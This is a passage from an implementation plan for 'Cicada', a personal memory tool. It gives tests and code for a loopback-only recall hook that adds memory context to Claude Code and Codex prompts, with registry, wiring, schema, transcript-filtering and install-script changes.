    for env, why in (({"CICADA_CAPTURE": "off"}, "CICADA_CAPTURE=off"), ({"CICADA_RECALL": "OFF"}, "CICADA_RECALL=off")):
        rc, calls, out, log = _run(tmp_path, UPS, environ=env)
        assert (rc, calls, out) == (0, [], "") and why in log.read_text()


def test_a_codex_sub_agent_prompt_is_skipped(tmp_path):
    rc, calls, out, log = _run(tmp_path, {**UPS, "agent_id": "a1", "agent_type": "explorer"},
                               argv=("--harness", "codex"))
    assert (rc, calls, out) == (0, [], "") and "sub-agent" in log.read_text()


def test_every_failure_exits_zero_prints_nothing_and_logs_no_words(tmp_path):
    for payload in ("{not json", [1, 2], {**UPS, "hook_event_name": "Stop"}, {**UPS, "session_id": ""}):
        rc, calls, out, _ = _run(tmp_path, payload)
        assert (rc, calls, out) == (0, [], "")

    def boom(url, body, tok, timeout):
        raise OSError(f"connection refused while sending {PROMPT}")

    rc, _, out, log = _run(tmp_path, UPS, post=boom)
    assert (rc, out) == (0, "") and "error: OSError" in log.read_text() and PROMPT not in log.read_text()
    rc, _, out, log = _run(tmp_path, UPS, post=lambda *a: (422, json.dumps({"detail": [{"input": PROMPT}]})))
    assert (rc, out) == (0, "") and "http 422" in log.read_text() and PROMPT not in log.read_text()
    rc, _, out, _ = _run(tmp_path, UPS, post=lambda *a: (200, "not json"))
    assert (rc, out) == (0, "")
    (tmp_path / "api_token").unlink()
    rc = hook.main(["--harness", "codex"], stdin=io.StringIO(json.dumps(UPS)), stdout=io.StringIO(), environ={},
                   post=lambda *a: (200, "{}"), log_path=tmp_path / "l.log", token_path=tmp_path / "api_token")
    assert rc == 0 and "no api_token" in (tmp_path / "l.log").read_text()


def test_the_env_token_wins_over_the_file(tmp_path):
    _, calls, _, _ = _run(tmp_path, UPS, environ={"CICADA_API_TOKEN": "env-tok"})
    assert calls[0][2] == "env-tok"


def test_a_long_prompt_is_windowed_before_it_leaves(tmp_path):
    long = "lorem " * 5000 + "so how is the alpha project?"
    _, calls, _, _ = _run(tmp_path, {**UPS, "prompt": long})
    sent = calls[0][1]["prompt"]
    assert len(sent) == hook.HEAD_CHARS + 1 + hook.TAIL_CHARS and sent.endswith("alpha project?")


def test_a_codex_payload_forwards_its_model(tmp_path):
    payload = {**UPS, "turn_id": "t1", "model": "gpt-example", "permission_mode": "default"}
    _, calls, _, _ = _run(tmp_path, payload, argv=("--harness", "codex"))
    assert calls[0][1]["harness"] == "codex" and calls[0][1]["model"] == "gpt-example"


def test_a_reason_that_is_not_an_enum_is_not_logged(tmp_path):
    _, _, _, log = _run(tmp_path, UPS, reply={"additionalContext": None, "injected": [], "reason": PROMPT})
    assert PROMPT not in log.read_text() and "other" in log.read_text()


def test_log_is_private_and_rotates(tmp_path):
    log = tmp_path / "logs" / "recall.log"
    log.parent.mkdir()
    log.write_text("x" * (hook.LOG_MAX_BYTES + 1))
    _run(tmp_path, UPS)
    assert (tmp_path / "logs" / "recall.log.1").exists()
    assert oct(log.stat().st_mode & 0o777) == "0o600"


def test_the_hook_imports_nothing_from_api():
    src = Path(hook.__file__).read_text()
    assert "from api" not in src and "import api" not in src
```

Append to `api/tests/test_hook_recall_privacy.py` (Task 2's file; add `import json` to its imports). This is the
privacy gate's hook-script half, which Task 2 could not hold because the script did not exist yet:

```python
def test_the_hook_script_round_trip_leaks_nothing(bank, monkeypatch, caplog):  # noqa: F811
    """The stdlib hook driven end to end against the real route (its `post`
    is the TestClient): a hit, and a 30 KB paste whose kept tail carries the
    sentinel. Nothing lands in a log, recall.log, the ledger or the bank."""
    from api.hooks import recall as recall_hook

    monkeypatch.setenv("CICADA_TELEMETRY", "on")
    monkeypatch.setenv("CICADA_MEMORY_PATH", str(bank))
    config.get_settings.cache_clear()
    home = Path(os.environ["CICADA_HOME"])
    home.mkdir(parents=True, exist_ok=True)
    (home / "api_token").write_text("tok")
    sink = io.StringIO()
    handler = logger.add(sink, level="DEBUG", backtrace=True, diagnose=True)
    caplog.set_level(logging.DEBUG)
    try:
        client = TestClient(main.app)

        def post(url, raw, token, timeout):
            resp = client.post("/capture/hook-context", content=raw, headers={"Content-Type": "application/json"})
            return resp.status_code, resp.text

        for payload in ({"session_id": "s-hook", "hook_event_name": "UserPromptSubmit", "prompt": PROMPT},
                        {"session_id": "s-hook", "hook_event_name": "UserPromptSubmit",
                         "prompt": "y" * 30_000 + SENTINEL}):
            assert recall_hook.main(["--harness", "claude-code"], stdin=io.StringIO(json.dumps(payload)),
                                    stdout=io.StringIO(), environ={"CICADA_HOME": str(home)}, post=post) == 0
    finally:
        logger.remove(handler)
        config.get_settings.cache_clear()
    assert SENTINEL not in sink.getvalue() and SENTINEL not in caplog.text
    assert "injected" in (home / "logs" / "recall.log").read_text(), "the round trip really reached the route"
    for path in _files(home) + _files(bank):
        assert SENTINEL.encode() not in path.read_bytes(), path
```

Additions to `api/tests/test_hooks_registry.py`:

```python
RECALL = '"/opt/example/api/.venv/bin/python" "/opt/example/api/hooks/recall.py" --harness claude-code'


def test_recall_entries_sit_beside_the_stop_hook_and_never_collapse_it(tmp_path):
    p = tmp_path / "settings.json"
    reg.install(p, event="Stop", command=CMD)
    for ev in ("SessionStart", "UserPromptSubmit"):
        assert reg.install(p, event=ev, command=RECALL) == "added"
        assert reg.install(p, event=ev, command=RECALL) == "present"
        assert reg.status(p, event=ev, command=RECALL) == "present"
    assert reg.status(p, event="Stop", command=CMD) == "present"
    assert [h["command"] for e in _read(p)["hooks"]["Stop"] for h in e["hooks"]] == [CMD]


def test_a_capture_entry_in_an_event_is_never_mistaken_for_the_recall_hook(tmp_path):
    p = tmp_path / "settings.json"
    reg.install(p, event="SessionStart", command=CMD)
    assert reg.status(p, event="SessionStart", command=RECALL) == "absent"
    assert reg.install(p, event="SessionStart", command=RECALL) == "added"
    assert [h["command"] for e in _read(p)["hooks"]["SessionStart"] for h in e["hooks"]] == [CMD, RECALL]


def test_a_moved_repo_updates_the_recall_entries(tmp_path):
    p = tmp_path / "settings.json"
    reg.install(p, event="UserPromptSubmit", command=RECALL)
    moved = RECALL.replace("/opt/example", "/srv/example")
    assert reg.status(p, event="UserPromptSubmit", command=moved) == "stale"
    assert reg.install(p, event="UserPromptSubmit", command=moved) == "updated"
    assert [h["command"] for e in _read(p)["hooks"]["UserPromptSubmit"] for h in e["hooks"]] == [moved]


def test_uninstall_hook_recall_leaves_the_stop_hook_and_other_hooks(tmp_path):
    p = tmp_path / "settings.json"
    p.write_text(json.dumps({"hooks": {"UserPromptSubmit": [{"hooks": [{"type": "command", "command": "/o/u.sh"}]}]}}))
    reg.install(p, event="Stop", command=CMD)
    reg.install(p, event="SessionStart", command=RECALL)
    reg.install(p, event="UserPromptSubmit", command=RECALL)
    assert reg.uninstall(p, hook="recall") == 2
    data = _read(p)
    assert [h["command"] for e in data["hooks"]["Stop"] for h in e["hooks"]] == [CMD]
    assert [h["command"] for e in data["hooks"]["UserPromptSubmit"] for h in e["hooks"]] == ["/o/u.sh"]
    assert "SessionStart" not in data["hooks"]
    assert reg.main(["uninstall", "--settings", str(p), "--hook", "recall"]) == 0


def test_a_bare_uninstall_removes_both_scripts(tmp_path):
    p = tmp_path / "settings.json"
    reg.install(p, event="Stop", command=CMD)
    reg.install(p, event="SessionStart", command=RECALL)
    reg.install(p, event="UserPromptSubmit", command=RECALL)
    assert reg.uninstall(p) == 3 and _read(p) == {}
```

Additions to `api/tests/test_agent_wiring.py`:

```python
RECALL_CMD = f'"{PY}" "{REPO}/api/hooks/recall.py" --harness claude-code'


def _recall_on(settings: Path, command: str = RECALL_CMD, events=("SessionStart", "UserPromptSubmit")):
    for ev in events:
        hook_registry.install(settings, event=ev, command=command)


def test_recall_is_its_own_two_steps_and_connect_is_unchanged(tmp_path):
    row = _row(_probe(tmp_path), "claude-code")
    settings = str(tmp_path / ".claude/settings.json")
    assert row["autorecall"] == "off" and row["autorecall_off"] == []
    assert [s["argv"] for s in row["autorecall_on"]] == [
        [PY, f"{REPO}/api/hooks/registry.py", "install", "--settings", settings, "--event", ev, "--command", RECALL_CMD]
        for ev in ("SessionStart", "UserPromptSubmit")]
    for step in row["autorecall_on"]:
        assert step["step"] == "autorecall" and step["display"] == shlex.join(step["argv"])
        assert step["touches"] == ["~/.claude/settings.json"]
    assert [s["step"] for s in row["connect"]] == ["mcp", "hook"], "R-H11: onboarding's Turn on runs what it ran"


def test_recall_on_offers_only_turn_off(tmp_path):
    _recall_on(tmp_path / ".claude/settings.json")
    row = _row(_probe(tmp_path), "claude-code")
    assert (row["autorecall"], row["autorecall_on"]) == ("on", [])
    assert [s["argv"] for s in row["autorecall_off"]] == [
        [PY, f"{REPO}/api/hooks/registry.py", "uninstall", "--settings", str(tmp_path / ".claude/settings.json"),
         "--hook", "recall"]]


def test_half_registered_or_moved_recall_is_stale_and_offers_both(tmp_path):
    _recall_on(tmp_path / ".claude/settings.json", events=("SessionStart",))
    row = _row(_probe(tmp_path), "claude-code")
    assert row["autorecall"] == "stale" and len(row["autorecall_on"]) == 2 and len(row["autorecall_off"]) == 1
    _recall_on(tmp_path / ".codex/hooks.json", command='"/old/python" "/old/api/hooks/recall.py" --harness codex')
    assert _row(_probe(tmp_path), "codex")["autorecall"] == "stale"


def test_an_unparseable_settings_file_offers_no_recall_step(tmp_path):
    settings = tmp_path / ".codex/hooks.json"
    settings.parent.mkdir(parents=True)
    settings.write_text("{not json", encoding="utf-8")
    row = _row(_probe(tmp_path), "codex")
    assert (row["autorecall"], row["autorecall_on"], row["autorecall_off"]) == ("invalid", [], [])


def test_a_missing_binary_carries_no_recall_fields(tmp_path):
    for row in _probe(tmp_path, resolve=lambda name: None)["agents"]:
        assert "autorecall" not in row, "the schema's default (n/a) speaks for it"


def test_install_sh_and_the_wiring_spell_the_recall_command_identically():
    text = (Path(agent_wiring.__file__).resolve().parents[2] / "install.sh").read_text(encoding="utf-8")
    fmt = re.search(r"recall_command\(\) \{ printf '([^']+)' ", text).group(1)
    assert fmt % (PY, f"{REPO}/api/hooks/recall.py", "claude-code") == RECALL_CMD
    assert 'RECALL_SCRIPT="$REPO/api/hooks/recall.py"' in text


def test_the_shared_autorecall_fixture_matches():
    """AutoRecallTests.swift reads the same file: the argv the backend serves
    and the argv the app's allowlist runs cannot drift apart."""
    fixture = json.loads((Path(__file__).parent / "fixtures/agent_autorecall_argv.json").read_text())
    root, home = Path(fixture["root"]), Path(fixture["home"])
    python = f"{fixture['root']}/api/.venv/bin/python"
    by_id = {h.id: h for h in agent_wiring.HARNESSES}
    for case in fixture["cases"]:
        argv = agent_wiring.autorecall_argv(by_id[case["agent"]], home=home, repo=root, python=python)
        assert [s["argv"] for s in argv[case["list"]]][case["index"]] == case["argv"], case


def test_the_route_serves_the_recall_fields_in_camel_case(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient
    from api import main

    step = {"step": "autorecall", "display": "x", "argv": ["x"], "touches": []}

    async def fake_probe(*, home, memory_root):
        return {"agents": [{"id": "codex", "installed": True, "autorecall": "off", "autorecall_on": [step]}],
                "python": PY, "repo": str(REPO), "memory": str(memory_root)}

    monkeypatch.setenv("CICADA_MEMORY_PATH", str(tmp_path))
    config.get_settings.cache_clear()
    monkeypatch.setattr(agent_wiring, "probe", fake_probe)
    agent = TestClient(main.app).get("/agents/wiring").json()["agents"][0]
    config.get_settings.cache_clear()
    assert agent["autorecall"] == "off" and agent["autorecallOn"][0]["step"] == "autorecall"
    assert agent["autorecallOff"] == []
```

(Add `import re` to the file's imports.)

`api/tests/fixtures/agent_autorecall_argv.json`. The `list` is `on`/`off`, keyed like `autorecall_argv`'s return
value, and `index` is the position in that list.

```json
{
  "root": "/R/cicada",
  "home": "/H",
  "cases": [
    {"agent": "claude-code", "list": "on", "index": 0,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "install", "--settings",
              "/H/.claude/settings.json", "--event", "SessionStart", "--command",
              "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/recall.py\" --harness claude-code"]},
    {"agent": "claude-code", "list": "on", "index": 1,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "install", "--settings",
              "/H/.claude/settings.json", "--event", "UserPromptSubmit", "--command",
              "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/recall.py\" --harness claude-code"]},
    {"agent": "claude-code", "list": "off", "index": 0,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "uninstall", "--settings",
              "/H/.claude/settings.json", "--hook", "recall"]},
    {"agent": "codex", "list": "on", "index": 0,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "install", "--settings",
              "/H/.codex/hooks.json", "--event", "SessionStart", "--command",
              "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/recall.py\" --harness codex"]},
    {"agent": "codex", "list": "on", "index": 1,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "install", "--settings",
              "/H/.codex/hooks.json", "--event", "UserPromptSubmit", "--command",
              "\"/R/cicada/api/.venv/bin/python\" \"/R/cicada/api/hooks/recall.py\" --harness codex"]},
    {"agent": "codex", "list": "off", "index": 0,
     "argv": ["/R/cicada/api/.venv/bin/python", "/R/cicada/api/hooks/registry.py", "uninstall", "--settings",
              "/H/.codex/hooks.json", "--hook", "recall"]}
  ]
}
```

Additions to `api/tests/test_transcript_extract.py` (add `from api.services import recall_text`):

```python
def test_a_cicada_note_is_never_captured_as_the_persons_words():
    """G149 R-H12: whatever shape Claude Code stores hook context in, a note
    Cicada recalled never becomes 'the person said'."""
    note = recall_text.RECALL_HEADER + "\n- Alpha Project (project, `alpha-project`): x"
    lines = [
        user("How is the Alpha Project going?"),
        user(note),
        user_blocks([{"type": "text", "text": "  " + note}, {"type": "text", "text": "and Bob?"}]),
        user(f"<system-reminder>{note}</system-reminder>What changed?"),
        user(f"<user-prompt-submit-hook>{note}</user-prompt-submit-hook>"),
        user(f"And the budget?\n<user-prompt-submit-hook>{note}</user-prompt-submit-hook>"),
        user(f"<session-start-hook>{note}"),                       # an unclosed tag still opens the block
        asst_text("It is on track."),
    ]
    conv = tx.extract_claude_code(lines)
    assert all("From Cicada" not in t.text for t in conv.turns)
    assert [t.text for t in conv.turns if t.role == "user"] == ["How is the Alpha Project going?", "and Bob?",
                                                                 "What changed?", "And the budget?"]


def test_codex_keeps_hook_context_out_even_under_the_user_role():
    note = recall_text.PRIMER_HEADER + "\n\n# Cicada — personal memory for this person"
    lines = [cx_msg("developer", [note]), cx_msg("user", [note, "Rename alpha-project?"]), cx_msg("assistant", ["Yes."])]
    assert [(t.role, t.text) for t in tx.extract_codex(lines).turns] == [
        ("user", "Rename alpha-project?"), ("assistant", "Yes.")]
```

Run all of them → red.

- [ ] **Step 2: `api/hooks/recall.py`.**

```python
#!/usr/bin/env python3
"""Cicada implicit-recall hook (G149): the read side of G105's Stop hook.

Registered by ``install.sh`` (and by the app's Settings → Agents → Remembers
automatically) under ``hooks.SessionStart`` AND ``hooks.UserPromptSubmit`` in
``~/.claude/settings.json`` and ``~/.codex/hooks.json`` as::

    "<venv python>" "<repo>/api/hooks/recall.py" --harness claude-code

One command for both events: the harness's own stdin names the event
(``hook_event_name``, a common input field in Claude Code; Codex's
``SessionStartCommandInput`` / ``UserPromptSubmitCommandInput``, openai/codex
``codex-rs/hooks/src/schema.rs`` @ c098f97). This script POSTs the event, the
session id and, for UserPromptSubmit only, the prompt (``prompt`` in both
harnesses, windowed exactly as ``hook_recall.prompt_window`` reads it) to
``POST /capture/hook-context`` as a JSON body, never a query string. It
prints ``{"hookSpecificOutput": {"hookEventName": …, "additionalContext": …}}``
when the backend has something to say, the one output shape both harnesses
parse (Claude Code's hook reference, read 2026-09-24; Codex's
``output_parser.rs``). Otherwise it prints nothing.

It never blocks and never erases a prompt: exit 0 always, never 2 (exit 2 on
UserPromptSubmit blocks the prompt and erases it). The one request has a
0.9 s timeout, so the whole script stays under about a second; the backend
holds itself to 300 ms and answers "nothing" past that (R-H6).

``CICADA_CAPTURE=off`` (every CLI Cicada itself spawns, G105 R8) and
``CICADA_RECALL=off`` (the person's switch) exit before any request. A Codex
sub-agent's prompt (``agent_id`` set) is the parent agent talking, not the
person, and is skipped (R-H15).

One line per firing goes to ``~/.cicada/logs/recall.log`` (0600, rotated at
1 MB): the time, the harness, the session id's first 8 characters, the event,
the HTTP status, the backend's reason enum, the number of pages and the
latency. It NEVER holds the prompt, a page id or a response body (FastAPI's
422 echoes its input). An error line names the exception class only, because
a message can carry the input (R-H10).

Stdlib only, run by path: a hook has no cwd guarantee and no venv on its
``sys.path``, so nothing here imports ``api.*`` (G105 R14).
"""

from __future__ import annotations

import json
import os
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

TIMEOUT_S = 0.9
LOG_MAX_BYTES = 1024 * 1024
HEAD_CHARS = 6000
TAIL_CHARS = 2000
EVENTS = {"SessionStart": "session_start", "UserPromptSubmit": "user_prompt_submit"}
_REASON_RE = re.compile(r"[a-z_]{1,32}")


def _default_post(url: str, body: bytes, token: str, timeout: float) -> tuple[int, str]:
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 - loopback only
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        # A 4xx body can echo the prompt back (FastAPI's 422): never read it.
        return exc.code, ""


def _log(path: Path, message: str) -> None:
    """Append one line, 0600, rotating once past :data:`LOG_MAX_BYTES`.
    A log failure must never become a hook failure, so ``OSError`` is swallowed."""
    try:
        path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
        if path.exists() and path.stat().st_size > LOG_MAX_BYTES:
            os.replace(path, path.with_suffix(".log.1"))
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
        try:
            os.write(fd, f"{time.strftime('%Y-%m-%dT%H:%M:%S%z')} {message}\n".encode("utf-8"))
        finally:
            os.close(fd)
    except OSError:
        pass


def _window(prompt: str) -> str:
    """``hook_recall.prompt_window``'s rule, restated because this script
    imports nothing: a 1 MB paste never crosses the loopback."""
    if len(prompt) <= HEAD_CHARS + TAIL_CHARS:
        return prompt
    return prompt[:HEAD_CHARS] + "\n" + prompt[-TAIL_CHARS:]


def _off(environ, key: str) -> bool:
    return str(environ.get(key, "")).strip().lower() == "off"


def main(argv=None, *, stdin=None, stdout=None, environ=None, post=None, log_path=None, token_path=None) -> int:
    """Ask the backend for a note and print it; return 0 unconditionally.
    Every collaborator is injectable so the tests run the whole path with no
    network and no real home directory."""
    argv = list(sys.argv[1:] if argv is None else argv)
    environ = os.environ if environ is None else environ
    stdin = sys.stdin if stdin is None else stdin
    stdout = sys.stdout if stdout is None else stdout
    post = _default_post if post is None else post
    home = Path(environ.get("CICADA_HOME") or (Path.home() / ".cicada"))
    log_path = log_path or home / "logs" / "recall.log"
    token_path = token_path or home / "api_token"

    harness = "claude-code"
    if "--harness" in argv:
        try:
            harness = argv[argv.index("--harness") + 1]
        except IndexError:
            pass
    tag = f"{harness} ?"
    try:
        for key in ("CICADA_CAPTURE", "CICADA_RECALL"):
            if _off(environ, key):
                _log(log_path, f"{tag} skipped: {key}=off")
                return 0
        try:
            payload = json.loads(stdin.read() or "{}")
        except ValueError:
            _log(log_path, f"{tag} skipped: stdin is not JSON")
            return 0
        if not isinstance(payload, dict):
            _log(log_path, f"{tag} skipped: stdin is not an object")
            return 0
        session_id = str(payload.get("session_id") or "")
        tag = f"{harness} {session_id[:8] or '?'}"
        hook_event = str(payload.get("hook_event_name") or "")
        event = EVENTS.get(hook_event)
        if event is None or not session_id:
            _log(log_path, f"{tag} skipped: not a recall event")
            return 0
        if event == "user_prompt_submit" and payload.get("agent_id"):
            _log(log_path, f"{tag} {event} skipped: a sub-agent's prompt")
            return 0
        token = str(environ.get("CICADA_API_TOKEN") or "").strip()
        if not token:
            try:
                token = token_path.read_text(encoding="utf-8").strip()
            except OSError:
                token = ""
        if not token:
            _log(log_path, f"{tag} {event} skipped: no api_token at {token_path.name}")
            return 0
        prompt = payload.get("prompt")
        body = {
            "event": event,
            "harness": harness,
            "session_id": session_id,
            "cwd": payload.get("cwd") if isinstance(payload.get("cwd"), str) else None,
            "model": payload.get("model") if isinstance(payload.get("model"), str) else None,
            "prompt": _window(prompt) if event == "user_prompt_submit" and isinstance(prompt, str) else None,
        }
        port = str(environ.get("CICADA_PORT") or "8000")
        started = time.monotonic()
        status, text = post(f"http://127.0.0.1:{port}/capture/hook-context", json.dumps(body).encode("utf-8"),
                            token, TIMEOUT_S)
        ms = int((time.monotonic() - started) * 1000)
        reason, pages, context = "-", 0, None
        if status == 200:
            try:
                parsed = json.loads(text)
                raw = str(parsed.get("reason") or "")
                reason = raw if _REASON_RE.fullmatch(raw) else "other"
                pages = len(parsed.get("injected") or [])
                context = parsed.get("additionalContext")
            except (ValueError, AttributeError, TypeError):
                reason = "unparseable"
        if isinstance(context, str) and context.strip():
            stdout.write(json.dumps({"hookSpecificOutput": {"hookEventName": hook_event,
                                                            "additionalContext": context}}))
            stdout.flush()
        _log(log_path, f"{tag} {event} http {status} {reason} pages={pages} {ms}ms")
    except Exception as exc:  # noqa: BLE001 - the harness must never see a failure
        _log(log_path, f"{tag} error: {type(exc).__name__}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 3: `api/hooks/registry.py`.**
  - The docstring gains: "G149 adds the recall hook (`api/hooks/recall.py`, registered under `SessionStart` and
    `UserPromptSubmit`). Each script is owned by its own marker, so installing one never collapses the other, and
    `uninstall --hook recall` removes only the recall entries. The CLI line becomes
    `registry.py uninstall --settings <file> [--hook capture|recall]`."
  - Code changes:

```python
MARKER = "api/hooks/capture.py"
RECALL_MARKER = "api/hooks/recall.py"
#: Every script Cicada registers, by the name ``uninstall --hook`` takes (G149).
MARKERS = {"capture": MARKER, "recall": RECALL_MARKER}


def _markers_for(command: str) -> tuple[str, ...]:
    """The marker a command carries. An entry is "ours" for an install or a
    status only when it carries the SAME marker, so the recall hook and the
    Stop hook never collapse each other."""
    found = tuple(m for m in MARKERS.values() if m in command)
    return found or (MARKER,)


def _ours(hook: dict, markers: tuple[str, ...] = tuple(MARKERS.values())) -> bool:
    return isinstance(hook, dict) and any(m in str(hook.get("command") or "") for m in markers)
```

  - In `install`, compute `mine = _markers_for(command)`, and use `_ours(h, mine)` in both the `found` list and the
    collapse filter.
  - In `status`, use `_ours(h, _markers_for(command))`.
  - `uninstall(path: Path, *, hook: str | None = None) -> int` uses
    `markers = (MARKERS[hook],) if hook else tuple(MARKERS.values())`, then `_ours(h, markers)` in its filter.
  - In `main`, add `ap.add_argument("--hook", choices=tuple(MARKERS), default=None)`. The uninstall branch calls
    `uninstall(path, hook=args.hook)` and prints `removed {n} hook(s): {path}` as before.

- [ ] **Step 4: `agent_wiring.py`** (additive; `_harness`, `connect` and `PROBE_TIMEOUT_S` untouched). The module
  docstring gains a paragraph: "G149 adds *auto-recall*: the SessionStart + UserPromptSubmit recall hooks' state and
  argv, kept apart from `connect`, which onboarding runs (R-H11)." Add after `_autosave`:

```python
RECALL_EVENTS = ("SessionStart", "UserPromptSubmit")


def recall_hook_command(python: str, repo: Path, harness: str) -> str:
    """install.sh's ``recall_command``, character for character (G149), for the
    same reason this module's ``hook_command`` mirrors install.sh's
    ``hook_command``: ``registry.status`` compares bytes (R-IA15)."""
    return f'"{python}" "{repo}/api/hooks/recall.py" --harness {harness}'


def autorecall_argv(h: Harness, *, home: Path, repo: Path, python: str) -> dict[str, list[dict]]:
    """Both of the recall hook's command sets for one harness, whatever its
    state. ``on`` registers SessionStart and UserPromptSubmit; it is idempotent
    (``install`` answers ``present`` for an event already right, and updates a
    stale one). ``off`` removes Cicada's recall entries and nothing else
    (``--hook recall``): the Stop hook stays."""
    settings = str(home / h.settings)
    registry = str(repo / "api" / "hooks" / "registry.py")
    command = recall_hook_command(python, repo, h.id)
    touches = [f"~/{h.settings}"]
    return {
        "on": [_step("autorecall", [python, registry, "install", "--settings", settings, "--event", event,
                                    "--command", command], touches) for event in RECALL_EVENTS],
        "off": [_step("autorecall-off", [python, registry, "uninstall", "--settings", settings, "--hook", "recall"],
                      touches)],
    }


def _autorecall(path: Path, command: str) -> str:
    try:
        hook_registry.load(path)
    except hook_registry.RegistryError:
        return "invalid"
    states = {hook_registry.status(path, event=event, command=command) for event in RECALL_EVENTS}
    return "on" if states == {"present"} else "off" if states == {"absent"} else "stale"


def autorecall_fields(h: Harness, *, home: Path, repo: Path, python: str) -> dict:
    """``GET /agents/wiring``'s G149 half for one installed harness. It is
    additive: ``connect`` (what onboarding and the C5 setup prompt run) is
    untouched, so turning recall on stays its own click (R-H11). A half
    registered or moved hook is ``stale`` and offers both lists; an unparseable
    file offers nothing."""
    state = _autorecall(home / h.settings, recall_hook_command(python, repo, h.id))
    argv = autorecall_argv(h, home=home, repo=repo, python=python)
    return {"autorecall": state,
            "autorecall_on": argv["on"] if state in ("off", "stale") else [],
            "autorecall_off": argv["off"] if state in ("on", "stale") else []}
```

  In `probe`, between the `gather` and the `return`:

```python
    # G149, additive: each installed harness row gains its recall hooks' state
    # and argv; a harness that is not installed keeps the schema's "n/a".
    by_id = {h.id: h for h in HARNESSES}
    rows = [{**row, **autorecall_fields(by_id[row["id"]], home=home, repo=repo, python=python)}
            if row["installed"] else row for row in rows]
```

- [ ] **Step 5: `schemas.py`.**
  - `AgentWiringStep.step: Literal["mcp", "hook", "autorecall", "autorecall-off"]`.
  - `AgentWiringRow` gains the fields below. Its docstring gains: "`autorecall` (G149) is the recall hooks'
    state; `autorecall_on`/`autorecall_off` are what Settings → Agents runs, apart from `connect`."

```python
    autorecall: Literal["on", "off", "stale", "invalid", "n/a"] = "n/a"
    autorecall_on: list[AgentWiringStep] = []
    autorecall_off: list[AgentWiringStep] = []
```

- [ ] **Step 6: `transcript_extract.py` (R-H12).**
  - Add `from api.services import recall_text` to the imports (after the `episode_scrub` import, `:39`).
  - `CLAUDE_HARNESS_TAGS` (`:56-60`) gains `"user-prompt-submit-hook", "session-start-hook"`, with the comment:
    "G149 R-H12: tag names hook output could arrive under. Unverified here (no transcript is read, R2); a person
    never types them, so dropping them costs nothing."
  - Below `_SYSTEM_REMINDER_RE` (`:67`) add:

```python
# G149 R-H12: the same tags as a SPAN, stripped wherever it sits in a block,
# like a system reminder. `_first_tag` reads only a block's first tag, so hook
# output a harness appended after the person's prompt would otherwise be kept.
_HOOK_OUTPUT_RE = re.compile(r"<(user-prompt-submit-hook|session-start-hook)>.*?</\1>", re.DOTALL)
```

  - In the Claude Code block filter, `:297` becomes
    `text = _HOOK_OUTPUT_RE.sub("", _SYSTEM_REMINDER_RE.sub("", str(bk.get("text") or "")))`, and `:299` becomes
    `if tag in CLAUDE_HARNESS_TAGS or recall_text.is_injection(text):`.
  - The Codex user filter (`:373`) becomes:
    `kept = [t for t in texts if _first_tag(t) not in CODEX_HARNESS_TAGS and not recall_text.is_injection(t) and t.strip()]`.
  - Add one module-docstring sentence: "A note Cicada's own recall hook added (G149) is never the person's words,
    whatever shape the harness stores it in (`recall_text.is_injection`, `_HOOK_OUTPUT_RE`)."

- [ ] **Step 7: `install.sh`.**
  1. Insert two header lines after `:18`:
     `#   It also registers the G149 recall hooks (hooks.SessionStart + hooks.UserPromptSubmit →`
     `#   api/hooks/recall.py) the same way; CICADA_RECALL=off skips them.`
     Insert one line after `CODEX_HOOKS …` (now `:29`):
     `#   CICADA_RECALL        off = don't register the recall hooks (G149)`.
     `:70`'s `sed -n '3,28p'` becomes `sed -n '3,31p'`.
  2. After `hook_command() …` (`:55`) add:

```bash
RECALL_SCRIPT="$REPO/api/hooks/recall.py"
# G149: the recall hook's command — `agent_wiring.recall_hook_command`, character for character.
recall_command() { printf '"%s" "%s" --harness %s' "$VENV_PY" "$RECALL_SCRIPT" "$1"; }
```

  3. In the uninstall branch, `step "Removing the session-capture hook"` becomes
     `"Removing the session-capture and recall hooks"`, and `ok "Capture hook removed (if it existed)"` becomes
     `"Capture and recall hooks removed (if they existed)"`. `registry.py uninstall` already removes both markers.
     The venv-missing `warn` names both scripts.
  4. After section 5b add:

```bash
# --- 5c. Implicit recall hooks (G149) ---
# SessionStart sends the primer and UserPromptSubmit a short note of what memory
# holds about names in the message, so recall no longer depends on a model
# choosing to call cicada_recall. Read-only; the prompt is never logged.
hdr "5c. Implicit recall hooks"
if [ "$(printf '%s' "${CICADA_RECALL:-}" | tr '[:upper:]' '[:lower:]')" = "off" ]; then
  ok "CICADA_RECALL=off — recall hooks not registered (Settings → Agents turns them on)"
else
  for ev in SessionStart UserPromptSubmit; do
    if run "$VENV_PY" "$HOOKS_REGISTRY" install --settings "$CLAUDE_SETTINGS" --event "$ev" --command "$(recall_command claude-code)"; then
      ok "Claude Code $ev recall hook registered in $CLAUDE_SETTINGS (idempotent)"
    else
      warn "Could not register the $ev recall hook in $CLAUDE_SETTINGS — fix the file and re-run ./install.sh"
    fi
  done
  if command -v codex >/dev/null 2>&1; then
    for ev in SessionStart UserPromptSubmit; do
      if run "$VENV_PY" "$HOOKS_REGISTRY" install --settings "$CODEX_HOOKS" --event "$ev" --command "$(recall_command codex)"; then
        ok "Codex $ev recall hook registered in $CODEX_HOOKS"
      else
        warn "Could not register the Codex $ev recall hook in $CODEX_HOOKS"
      fi
    done
    warn "Codex runs a new hook only once you trust it: at its next start choose \"Trust all and continue\" (or /hooks)"
  fi
fi
```

  5. After the capture summary line (`:408`) add
